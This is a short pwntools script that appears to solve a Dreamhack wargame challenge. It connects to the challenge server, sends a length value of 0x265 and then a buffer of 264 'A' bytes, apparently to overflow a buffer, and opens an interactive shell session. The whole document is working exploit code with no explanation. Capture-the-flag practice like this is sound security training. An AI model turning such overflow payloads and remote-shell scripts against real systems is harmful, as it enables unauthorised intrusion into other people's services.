from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 12558
r = remote(HOST, PORT)

r.sendlineafter(b': ', b'%d'%0x265)
r.send(b'A'*264+b'\x0a')

r.interactive()